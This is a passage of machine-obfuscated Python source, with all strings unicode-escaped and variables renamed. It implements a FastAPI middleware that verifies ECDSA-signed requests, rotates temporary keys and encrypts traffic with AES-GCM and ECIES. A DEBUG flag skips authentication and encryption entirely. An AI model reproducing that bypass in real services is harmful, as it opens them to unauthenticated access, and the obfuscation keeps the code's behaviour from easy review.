        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail=codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0062\\u0061\\u0064\\u0020\\u0073\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065', 'unicode_escape'))

    @staticmethod
    def _verify_with(vk: VerifyingKey, auth_token: str, message: bytes) -> bool:
        try:
            O0_var_85 = base64.b64decode(auth_token)
            O0_var_86 = len(O0_var_85)
            if O0_var_86 == 64:
                O0_var_87 = sigdecode_string
            elif O0_var_86 > 64 and O0_var_85[0] == 48:
                O0_var_87 = sigdecode_der
            else:
                O0_var_87 = sigdecode_der
            vk.verify(O0_var_85, message, hashfunc=hashlib.sha256, sigdecode=O0_var_87)
            return True
        except BadSignatureError:
            return False
        except Exception:
            return False

    def encrypt_response(self, data: Dict[str, Any], O0_var_88: Optional[bytes]=None) -> str:
        O0_var_89 = O0_var_88 or self.ecies_pubkey
        if Config.DEBUG:
            return json.dumps(data, ensure_ascii=False, default=str)
        if not O0_var_89:
            raise RuntimeError(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u006e\\u006f\\u0074\\u0020\\u0069\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0064\\u002c\\u0020\\u0063\\u0061\\u006e\\u006e\\u006f\\u0074\\u0020\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0020\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065', 'unicode_escape'))
        try:
            O0_var_90 = json.dumps(data, ensure_ascii=False, default=str).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
            O0_var_91 = ecies_encrypt(O0_var_89, O0_var_90)
            return base64.b64encode(O0_var_91).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
        except Exception as e:
            raise RuntimeError(codecs.decode('\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u0020\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e)) from e

    def decrypt_data(O0_var_92: str, key: bytes):
        try:
            O0_var_93 = json.loads(base64.b64decode(O0_var_92).decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
            O0_var_94 = base64.b64decode(O0_var_93[codecs.decode('\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape')])
            O0_var_95 = base64.b64decode(O0_var_93[codecs.decode('\\u0074\\u0061\\u0067', 'unicode_escape')])
            O0_var_96 = base64.b64decode(O0_var_93[codecs.decode('\\u0063\\u0069\\u0070\\u0068\\u0065\\u0072\\u0074\\u0065\\u0078\\u0074', 'unicode_escape')])
            O0_var_97 = AES.new(key, AES.MODE_GCM, nonce=O0_var_94)
            O0_var_98 = O0_var_97.decrypt_and_verify(O0_var_96, O0_var_95)
            return O0_var_98.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        except ValueError:
            Logger.error(codecs.decode('\\u274c\\u0020\\u89e3\\u5bc6\\u5931\\u8d25\\uff1a\\u6570\\u636e\\u53ef\\u80fd\\u88ab\\u7be1\\u6539\\u6216\\u5bc6\\u94a5\\u9519\\u8bef', 'unicode_escape'))
            return None
        except Exception as e:
            Logger.error(codecs.decode('\\u274c\\u0020\\u5f02\\u5e38\\u003a\\u0020', 'unicode_escape') + str(e))
            return None

    @staticmethod
    def encrypt_data(plaintext: bytes, key: bytes) -> str:
        O0_var_99 = get_random_bytes(12)
        O0_var_100 = AES.new(key, AES.MODE_GCM, nonce=O0_var_99)
        O0_var_101, O0_var_102 = O0_var_100.encrypt_and_digest(plaintext)
        O0_var_103 = {codecs.decode('\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'): base64.b64encode(O0_var_99).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape')), codecs.decode('\\u0074\\u0061\\u0067', 'unicode_escape'): base64.b64encode(O0_var_102).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape')), codecs.decode('\\u0063\\u0069\\u0070\\u0068\\u0065\\u0072\\u0074\\u0065\\u0078\\u0074', 'unicode_escape'): base64.b64encode(O0_var_101).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))}
        return base64.b64encode(json.dumps(O0_var_103, separators=(codecs.decode('\\u002c', 'unicode_escape'), codecs.decode('\\u003a', 'unicode_escape'))).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
crypto = None

def O0_fn_2():
    global crypto
    if crypto is None:
        crypto = CryptoManager(Config.ECDSA_PUBLIC_KEY_PEM, Config.ECIES_PUBLIC_KEY_PEM)
    return crypto

def _generate_ecies_keypair() -> Tuple[bytes, bytes]:
    try:
        from ecdsa import SECP256k1, SigningKey as _EcdsaSigningKey
        O0_var_104 = SECP256k1.order
        while True:
            O0_var_105 = secrets.token_bytes(32)
            if 0 < int.from_bytes(O0_var_105, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) < O0_var_104:
                O0_var_106 = b'\x04' + _EcdsaSigningKey.from_string(O0_var_105, curve=SECP256k1).get_verifying_key().to_string()
                return (O0_var_105, O0_var_106)
    except Exception:
        pass
    try:
        from ecies.keys import PrivateKey as EciesPrivateKey
        O0_var_107 = EciesPrivateKey(codecs.decode('\\u0073\\u0065\\u0063\\u0070\\u0032\\u0035\\u0036\\u006b\\u0031', 'unicode_escape'))
        return (O0_var_107.secret, O0_var_107.public_key.to_bytes())
    except Exception:
        pass
    try:
        try:
            from ecies.utils import generate_keypair
            O0_var_108, O0_var_109 = generate_keypair()
        except Exception:
            from ecies.utils import generate_eth_key
            O0_var_110 = generate_eth_key()
            O0_var_108, O0_var_109 = (O0_var_110.public_key.to_hex(), O0_var_110.to_hex())
        O0_var_106 = bytes.fromhex(O0_var_108[2:] if O0_var_108.startswith(codecs.decode('\\u0030\\u0078', 'unicode_escape')) else O0_var_108)
        O0_var_111 = bytes.fromhex(O0_var_109[2:] if O0_var_109.startswith(codecs.decode('\\u0030\\u0078', 'unicode_escape')) else O0_var_109)
        return (O0_var_111, O0_var_106)
    except Exception as e:
        raise RuntimeError(codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u0070\\u0079\\u0020\\u5bc6\\u94a5\\u751f\\u6210\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
TEMP_ECDSA_CURVE = NIST256p

def _ecdsa_private_pkcs8_pem(O0_var_112: 'SigningKey') -> str:
    try:
        O0_var_113 = O0_var_112.to_der(format=codecs.decode('\\u0070\\u006b\\u0063\\u0073\\u0038', 'unicode_escape'))
    except (TypeError, ValueError):
        return O0_var_112.to_pem().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
    O0_var_114 = base64.b64encode(O0_var_113).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'))
    O0_var_115 = codecs.decode('\\u000a', 'unicode_escape').join((O0_var_114[O0_var_116:O0_var_116 + 64] for O0_var_116 in range(0, len(O0_var_114), 64)))
    return codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u000a', 'unicode_escape') + str(O0_var_115) + codecs.decode('\\u000a\\u002d\\u002d\\u002d\\u002d\\u002d\\u0045\\u004e\\u0044\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d', 'unicode_escape')

def _compress_point65(O0_var_117: bytes) -> bytes:
    if len(O0_var_117) != 65 or O0_var_117[0] != 4:
        raise ValueError(codecs.decode('\\u9700\\u8981\\u0020\\u0036\\u0035\\u0020\\u5b57\\u8282\\u672a\\u538b\\u7f29\\u70b9\\u0020\\u0028\\u0030\\u0034\\u007c\\u007c\\u0058\\u007c\\u007c\\u0059\\u0029', 'unicode_escape'))
    O0_var_118 = b'\x03' if O0_var_117[64] & 1 else b'\x02'
    return O0_var_118 + O0_var_117[1:33]

class TempKeyManager:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u4e34\\u65f6\\u5bc6\\u94a5\\u7ba1\\u7406\\u5668\\u0020\\u0028\\u7ebf\\u7a0b\\u5b89\\u5168\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u540c\\u4e00\\u65f6\\u523b\\u4ec5\\u7ef4\\u62a4\\u4e00\\u4efd\\u6709\\u6548\\u4e34\\u65f6\\u5bc6\\u94a5\\u5bf9\\uff0c\\u907f\\u514d\\u5185\\u90e8\\u591a\\u5934\\u5bc6\\u94a5\\u7ba1\\u7406\\u8d1f\\u62c5\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u6709\\u6548\\u671f\\u5185\\u91cd\\u590d\\u67e5\\u8be2\\u8fd4\\u56de\\u540c\\u4e00\\u5bc6\\u94a5\\u5bf9\\uff1b\\u8fc7\\u671f\\u540e\\u81ea\\u52a8\\u751f\\u6210\\u65b0\\u7684\\u5bc6\\u94a5\\u5bf9\\u000a\\u0020\\u0020\\u0020\\u0020\\u002d\\u0020\\u4e34\\u65f6\\u6301\\u6709\\u8005\\u003a\\u0020\\u7528\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u0050\\u002d\\u0032\\u0035\\u0036\\u0020\\u79c1\\u94a5\\u7b7e\\u540d\\u8bf7\\u6c42\\u002c\\u0020\\u7528\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u79c1\\u94a5\\u89e3\\u5bc6\\u54cd\\u5e94\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self):
        self._lock = threading.Lock()
        self._key: Optional[Dict[str, Any]] = None
        self.on_expired = None

    def get_or_create(self, O0_var_119: int) -> Dict[str, Any]:
        with self._lock:
            self._expire_current_locked()
            if self._key:
                return self._key
            self._key = self._generate(O0_var_119)
            Logger.info(codecs.decode('\\U0001f511\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u65b0\\u4e34\\u65f6\\u5bc6\\u94a5\\u5df2\\u751f\\u6210\\u003a\\u0020\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064\\u003d', 'unicode_escape') + str(self._key['key_id']) + codecs.decode('\\u002c\\u0020\\u6709\\u6548\\u671f\\u0020', 'unicode_escape') + str(O0_var_119) + codecs.decode('\\u0020\\u5c0f\\u65f6', 'unicode_escape'))
            return self._key

    def get_active_ecdsa_vk(self) -> Optional[VerifyingKey]:
        with self._lock:
            self._expire_current_locked()
            if self._key:
                return self._key.get(codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0076\\u006b', 'unicode_escape'))
            return None

    def get_active_ecies_pub(self) -> Optional[bytes]:
        with self._lock:
            self._expire_current_locked()
            if self._key:
                return self._key.get(codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062', 'unicode_escape'))
            return None

    def _expire_current_locked(self):
        if self._key and self._is_expired(self._key):
            O0_var_120 = self._key[codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape')]
            self._key = None
            Logger.warning(codecs.decode('\\U0001f504\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u4e34\\u65f6\\u5bc6\\u94a5\\u5df2\\u8fc7\\u671f\\u003a\\u0020\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064\\u003d', 'unicode_escape') + str(O0_var_120))
            O0_var_121 = self.on_expired
            if O0_var_121:
                try:
                    O0_var_121()
                except Exception as e:
                    Logger.error(codecs.decode('\\U0001f4a5\\u0020\\u005b\\u0054\\u0065\\u006d\\u0070\\u004b\\u0065\\u0079\\u005d\\u0020\\u8fc7\\u671f\\u8f6e\\u6362\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))

    def _is_expired(self, key: Dict[str, Any]) -> bool:
        return int(time.time()) >= key[codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape')]

    def _generate(self, O0_var_122: int) -> Dict[str, Any]:
        O0_var_123 = SigningKey.generate(curve=TEMP_ECDSA_CURVE)
        O0_var_124 = _ecdsa_private_pkcs8_pem(O0_var_123)
        O0_var_125 = O0_var_123.get_verifying_key().to_pem().decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        O0_var_126, O0_var_127 = _generate_ecies_keypair()
        O0_var_128 = int(time.time())
        O0_var_129 = int(O0_var_122) * 3600
        O0_var_130 = b'\x04' + O0_var_123.get_verifying_key().to_string()
        return {codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0069\\u0064', 'unicode_escape'): secrets.token_hex(8), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): O0_var_128, codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073\\u005f\\u0061\\u0074', 'unicode_escape'): O0_var_128 + O0_var_129, codecs.decode('\\u0074\\u0074\\u006c\\u005f\\u0073\\u0065\\u0063\\u006f\\u006e\\u0064\\u0073', 'unicode_escape'): O0_var_129, codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_124, codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_125, codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_126.hex(), codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape'): O0_var_127.hex(), codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u0068\\u0065\\u0078', 'unicode_escape'): O0_var_123.to_string().hex(), codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0062\\u0036\\u0034', 'unicode_escape'): base64.b64encode(_compress_point65(O0_var_130)).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape')), codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0062\\u0036\\u0034', 'unicode_escape'): base64.b64encode(_compress_point65(O0_var_127)).decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape')), codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0076\\u006b', 'unicode_escape'): O0_var_123.get_verifying_key(), codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062', 'unicode_escape'): O0_var_127}

class AuthEncryptMiddleware(BaseHTTPMiddleware):
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u8ba4\\u8bc1\\u0020\\u002b\\u0020\\u52a0\\u5bc6\\u4e2d\\u95f4\\u4ef6\\u000a\\u0020\\u0020\\u0020\\u0020\\u0031\\u002e\\u0020\\u8bf7\\u6c42\\u8fdb\\u5165\\u003a\\u0020\\u9a8c\\u8bc1\\u7b7e\\u540d\\u0020\\u002d\\u003e\\u0020\\u89e3\\u5bc6\\u0020\\u0042\\u006f\\u0064\\u0079\\u0020\\u0028\\u5982\\u679c\\u6807\\u8bb0\\u4e86\\u0020\\u0041\\u0045\\u0053\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u0032\\u002e\\u0020\\u54cd\\u5e94\\u8fd4\\u56de\\u003a\\u0020\\u52a0\\u5bc6\\u0020\\u0052\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u0020\\u0042\\u006f\\u0064\\u0079\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    async def dispatch(self, request: Request, O0_var_131):
        O0_var_132 = request.headers
        O0_var_133 = request.url.path
        O0_var_134 = [codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')]
        request.state.is_authenticated = False
        if Config.DEBUG:
            request.state.is_authenticated = True
            response = await O0_var_131(request)
            response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')] = codecs.decode('\\u0066\\u0061\\u006c\\u0073\\u0065', 'unicode_escape')
            return response
        if request.method in [codecs.decode('\\u004f\\u0050\\u0054\\u0049\\u004f\\u004e\\u0053', 'unicode_escape'), codecs.decode('\\u0048\\u0045\\u0041\\u0044', 'unicode_escape')]:
            return await O0_var_131(request)
        O0_var_135 = await request.body()
        O0_var_136 = codecs.decode('', 'unicode_escape')
        if O0_var_135 and O0_var_133 != codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0066\\u0069\\u006c\\u0065\\u0072\\u0061\\u0077', 'unicode_escape'):
            O0_var_136 = hashlib.sha256(O0_var_135).hexdigest()
        O0_var_137 = O0_var_132.get(codecs.decode('\\u0078\\u002d\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'))
        O0_var_138 = O0_var_132.get(codecs.decode('\\u0078\\u002d\\u0074\\u0069\\u006d\\u0065\\u0073\\u0074\\u0061\\u006d\\u0070', 'unicode_escape'))
        O0_var_139 = O0_var_132.get(codecs.decode('\\u0078\\u002d\\u0061\\u0075\\u0074\\u0068\\u002d\\u0074\\u006f\\u006b\\u0065\\u006e', 'unicode_escape'))
        if not all([O0_var_137, O0_var_138, O0_var_139]):
            if O0_var_133 in O0_var_134:
                return await O0_var_131(request)
            else:
                return JSONResponse(status_code=status.HTTP_401_UNAUTHORIZED, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004d\\u0069\\u0073\\u0073\\u0069\\u006e\\u0067\\u0020\\u0061\\u0075\\u0074\\u0068\\u0020\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')})
        try:
            O0_var_140 = None
            O0_var_141 = getattr(request.app.state, codecs.decode('\\u0074\\u0065\\u006d\\u0070\\u005f\\u006b\\u0065\\u0079\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
            if O0_var_141 is not None:
                O0_var_140 = O0_var_141.get_active_ecdsa_vk()
            O0_var_142 = await asyncio.to_thread(crypto.identify_signer, request.method, O0_var_133, O0_var_136, O0_var_137, O0_var_138, O0_var_139, O0_var_140)
            request.state.is_authenticated = True
            request.state.key_source = O0_var_142
        except Exception as e:
            if O0_var_133 in O0_var_134:
                return await O0_var_131(request)
            else:
                return JSONResponse(status_code=status.HTTP_401_UNAUTHORIZED, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0053\\u0069\\u0067\\u006e\\u0061\\u0074\\u0075\\u0072\\u0065\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e))})
        O0_var_143 = None
        if O0_var_132.get(codecs.decode('\\u0078\\u002d\\u0061\\u0065\\u0073\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')) == codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape'):
            if request.state.is_authenticated:
                if O0_var_135:
                    try:
                        O0_var_144 = O0_var_135.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        O0_var_145 = CryptoManager.decrypt_data(O0_var_144, Config._raw_key)
                        if Config.DEBUG:
                            Logger.debug(codecs.decode('\\u0020\\u005b\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u005d\\u0020\\u0053\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_145[:100]) + codecs.decode('\\u002e\\u002e\\u002e', 'unicode_escape'))
                        json.loads(O0_var_145)
                        O0_var_143 = O0_var_145.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        request._body = O0_var_143
                    except Exception as e:
                        Logger.error(codecs.decode('\\U0001f4a5\\u0020\\u005b\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u005d\\u0020\\u0046\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e)))
                        return JSONResponse(status_code=status.HTTP_400_BAD_REQUEST, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0041\\u0045\\u0053\\u0020\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(str(e))})
            else:
                return JSONResponse(status_code=status.HTTP_403_FORBIDDEN, content={codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0044\\u0065\\u0063\\u0072\\u0079\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0072\\u0065\\u006a\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0066\\u006f\\u0072\\u0020\\u0075\\u006e\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0073', 'unicode_escape')})
        O0_var_146 = False

        async def wrapped_receive():
            nonlocal O0_var_146
            if O0_var_143 is not None:
                if not O0_var_146:
                    O0_var_146 = True
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): O0_var_143, codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
                else:
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): b'', codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
            else:
                if not O0_var_146:
                    O0_var_146 = True
                    return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): O0_var_135, codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
                return {codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u002e\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): b'', codecs.decode('\\u006d\\u006f\\u0072\\u0065\\u005f\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): False}
        request._receive = wrapped_receive
        try:
            response = await O0_var_131(request)
        except Exception as exc:
            raise exc
        if response.headers.get(codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')).startswith(codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u002f\\u006a\\u0073\\u006f\\u006e', 'unicode_escape')):
            O0_var_147 = []
            async for O0_var_148 in response.body_iterator:
                O0_var_147.append(O0_var_148)
            O0_var_149 = b''.join(O0_var_147)
            try:
                if getattr(request.state, codecs.decode('\\u0069\\u0073\\u005f\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'), False):
                    if O0_var_133 == codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f', 'unicode_escape') or Config.DEBUG:
                        O0_var_150 = json.loads(O0_var_149.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
                        O0_var_151 = crypto.ecies_pubkey
                        if getattr(request.state, codecs.decode('\\u006b\\u0065\\u0079\\u005f\\u0073\\u006f\\u0075\\u0072\\u0063\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063', 'unicode_escape')) == codecs.decode('\\u0074\\u0065\\u006d\\u0070', 'unicode_escape'):
                            O0_var_141 = getattr(request.app.state, codecs.decode('\\u0074\\u0065\\u006d\\u0070\\u005f\\u006b\\u0065\\u0079\\u005f\\u006d\\u0061\\u006e\\u0061\\u0067\\u0065\\u0072', 'unicode_escape'), None)
                            if O0_var_141 is not None:
                                O0_var_151 = O0_var_141.get_active_ecies_pub() or O0_var_151
                        O0_var_152 = crypto.encrypt_response(O0_var_150, O0_var_151)
                        O0_var_153 = O0_var_152.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        if not Config.DEBUG:
                            response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')] = codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
                            response.headers[codecs.decode('\\u0078\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')] = Config.AGENT_VERSION
                    else:
                        O0_var_153 = CryptoManager.encrypt_data(O0_var_149, Config._raw_key).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
                        response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')] = codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
                        response.headers[codecs.decode('\\u0078\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')] = Config.AGENT_VERSION
                else:
                    O0_var_153 = O0_var_149
                    if codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape') in response.headers:
                        del response.headers[codecs.decode('\\u0078\\u002d\\u0065\\u006e\\u0063\\u0072\\u0079\\u0070\\u0074\\u0065\\u0064', 'unicode_escape')]
                response.body_iterator = self._async_iter([O0_var_153])
                response.headers[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] = str(len(O0_var_153))
            except json.JSONDecodeError:
                pass
        return response

    @staticmethod
    async def _async_iter(items):
